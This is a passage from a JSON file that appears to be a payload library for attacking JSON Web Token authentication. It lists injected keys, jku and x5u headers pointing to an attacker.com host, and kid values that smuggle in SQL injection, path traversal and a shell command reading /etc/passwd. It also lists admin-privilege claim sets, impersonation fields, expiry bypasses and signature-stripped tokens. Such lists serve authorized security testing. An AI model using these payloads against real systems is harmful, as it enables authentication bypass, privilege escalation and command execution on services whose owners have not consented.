  "header_injection": {
    "jwk_injection": {
      "description": "Inject attacker-controlled JWK in header",
      "header": {
        "alg": "RS256",
        "typ": "JWT",
        "jwk": {
          "kty": "RSA",
          "n": "attacker_controlled_n_value",
          "e": "AQAB"
        }
      }
    },
    "jku_injection": {
      "description": "Point jku to attacker-controlled server",
      "header": {
        "alg": "RS256",
        "typ": "JWT",
        "jku": "https://attacker.com/.well-known/jwks.json"
      }
    },
    "kid_injection": [
      {
        "description": "SQL injection via kid",
        "kid": "' UNION SELECT 'secret'--"
      },
      {
        "description": "Path traversal via kid",
        "kid": "../../../dev/null"
      },
      {
        "description": "Command injection via kid",
        "kid": "key_id | cat /etc/passwd"
      }
    ],
    "x5u_injection": {
      "description": "Point x5u to attacker certificate",
      "header": {
        "alg": "RS256",
        "typ": "JWT",
        "x5u": "https://attacker.com/cert.pem"
      }
    }
  },
  
  "payload_manipulation": {
    "privilege_escalation": [
      {"role": "admin"},
      {"role": "administrator"},
      {"admin": true},
      {"is_admin": true},
      {"isAdmin": true},
      {"user_type": "admin"},
      {"userType": "admin"},
      {"privilege": "admin"},
      {"privileges": ["admin", "write", "delete"]},
      {"permissions": ["*"]},
      {"scope": "admin"},
      {"groups": ["administrators"]}
    ],
    "user_impersonation": {
      "description": "Change sub/user_id to target user",
      "fields_to_modify": ["sub", "user_id", "userId", "uid", "email", "username"]
    },
    "expiration_bypass": {
      "description": "Extend or remove token expiration",
      "techniques": [
        {"exp": 9999999999},
        {"exp": 4102444800},
        "remove_exp_claim_entirely"
      ]
    }
  },
  
  "signature_attacks": {
    "empty_signature": {
      "description": "Remove signature entirely (keep two dots)",
      "example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
    },
    "null_signature": {
      "description": "Replace signature with null bytes",
      "example": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    }
  },
  
